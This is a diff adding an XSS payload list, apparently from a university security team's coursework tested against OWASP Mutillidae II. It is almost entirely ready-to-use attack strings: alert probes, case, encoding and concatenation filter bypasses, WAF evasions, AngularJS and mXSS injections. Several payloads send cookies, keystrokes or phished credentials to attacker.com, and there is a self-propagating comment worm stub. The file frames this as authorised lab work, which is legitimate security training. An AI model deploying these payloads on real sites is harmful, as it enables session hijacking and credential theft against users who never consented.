@@ -1,0 +1,114 @@
+# Cross-Site Scripting (XSS) Payloads
+# PAI-3 VULNAWEB - Security Team INSEGUS
+
+## XSS Básico
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>console.log('XSS')</script>
+
+## XSS con Image Tags
+<img src=x onerror=alert('XSS')>
+<img src=x onerror="alert('XSS')">
+<img src=x onerror="alert(1)">
+<img src=javascript:alert('XSS')>
+<img src="javascript:alert('XSS')">
+
+## XSS con SVG
+<svg onload=alert('XSS')>
+<svg/onload=alert('XSS')>
+<svg><script>alert('XSS')</script></svg>
+<svg><animate onbegin=alert('XSS')>
+
+## XSS con Input Tags
+<input onfocus=alert('XSS') autofocus>
+<input onblur=alert('XSS') autofocus><input autofocus>
+<input type="text" value="XSS" onclick="alert('XSS')">
+
+## XSS con Body Tags
+<body onload=alert('XSS')>
+<body/onload=alert('XSS')>
+<body onpageshow=alert('XSS')>
+
+## XSS con iFrame
+<iframe src="javascript:alert('XSS')">
+<iframe onload=alert('XSS')>
+<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=>
+
+## Cookie Stealing
+<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
+<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
+<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
+
+## Session Hijacking
+<script>
+var img = new Image();
+img.src = 'http://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
+</script>
+
+## Keylogger
+<script>
+document.onkeypress = function(e) {
+    fetch('http://attacker.com/log?key=' + e.key);
+}
+</script>
+
+## Phishing
+<script>
+document.body.innerHTML = '<h1>Session Expired</h1><form action="http://attacker.com/phish"><input name="user"><input type="password" name="pass"><input type="submit"></form>';
+</script>
+
+## Bypass Filters - Mayúsculas/Minúsculas
+<ScRiPt>alert('XSS')</sCrIpT>
+<SCRIPT>alert('XSS')</SCRIPT>
+
+## Bypass Filters - Encoding
+<script>alert&#40;'XSS'&#41;</script>
+<script>alert&#x28;'XSS'&#x29;</script>
+<img src=x onerror=\u0061lert('XSS')>
+
+## Bypass Filters - Strings Concatenation
+<script>alert('X'+'SS')</script>
+<script>eval('al'+'ert("XSS")')</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
+
+## DOM-Based XSS
+<script>document.write(location.hash.substring(1))</script>
+<script>eval(location.hash.substring(1))</script>
+
+## XSS con Event Handlers
+<div onmouseover="alert('XSS')">Hover me</div>
+<a href="#" onclick="alert('XSS')">Click me</a>
+<button onclick="alert('XSS')">Click</button>
+
+## XSS Stored (Persistente)
+<img src=x onerror="var img=new Image();img.src='http://attacker.com/steal?c='+document.cookie;">
+<script>
+// Worm - auto-propagación
+var xhr = new XMLHttpRequest();
+xhr.open('POST', '/add-comment', true);
+xhr.send('comment=<script>/* malicious code */</script>');
+</script>
+
+## Bypass WAF
+<script>alert`XSS`</script>
+<img src=x onerror=alert`1`>
+<svg><script>alert&#40;1)</script>
+<<script>alert('XSS')</script>
+
+## AngularJS Template Injection
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+
+## React JSX Injection
+{this.props.dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}}
+
+## Mutation XSS (mXSS)
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+
+# Notas:
+# - Payloads probados en OWASP Mutillidae II
+# - Los exitosos están documentados en el informe principal
+# - Cookie stealing requiere un servidor externo (attacker.com)
+# - Usar SOLO en entornos autorizados
